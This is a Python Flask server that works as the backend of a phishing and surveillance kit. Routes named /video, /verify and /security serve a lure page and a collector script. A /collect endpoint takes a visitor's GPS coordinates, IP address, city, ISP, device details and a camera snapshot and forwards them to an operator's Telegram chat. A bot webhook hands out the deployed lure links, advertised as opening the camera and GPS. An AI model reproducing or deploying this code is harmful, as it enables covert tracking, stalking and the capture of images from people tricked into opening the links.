from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
import base64
import os

app = Flask(__name__)
CORS(app)

TELEGRAM_TOKEN = os.environ.get('BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    msg = f"🎯 New Session\n🕐 {data.get('timestamp')}\n🆔 {data.get('sessionId')}\n📍 GPS: {data.get('gps',{}).get('lat','?')}, {data.get('gps',{}).get('lon','?')}\n🌐 IP: {data.get('network',{}).get('ip','?')}\n🏙 City: {data.get('network',{}).get('city','?')}\n📡 ISP: {data.get('network',{}).get('isp','?')}\n📱 {data.get('device',{}).get('platform','?')}"
    try:
        requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg})
    except: pass
    if data.get('photo'):
        try:
            b = base64.b64decode(data['photo'].split(',')[1])
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto', data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸'}, files={'photo': ('p.jpg', b, 'image/jpeg')})
        except: pass
    return jsonify({'status':'ok'})

@app.route('/')
@app.route('/video')
@app.route('/verify')
@app.route('/security')
def index():
    return send_from_directory('.', 'webpage.html')

@app.route('/collector.js')
def js():
    return send_from_directory('.', 'collector.js')

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text in ['/start', '/link']:
            msg = "🔗 Links Ready!\n\n1: https://hello-camera-production.up.railway.app/video\n2: https://hello-camera-production.up.railway.app/verify\n3: https://hello-camera-production.up.railway.app/security\n\n📸 Opens camera + GPS"
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', json={'chat_id': chat_id, 'text': msg})
    return jsonify({'status':'ok'})

@app.route('/setup_webhook')
def setup_webhook():
    r = requests.get(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url=https://hello-camera-production.up.railway.app/webhook')
    return jsonify(r.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
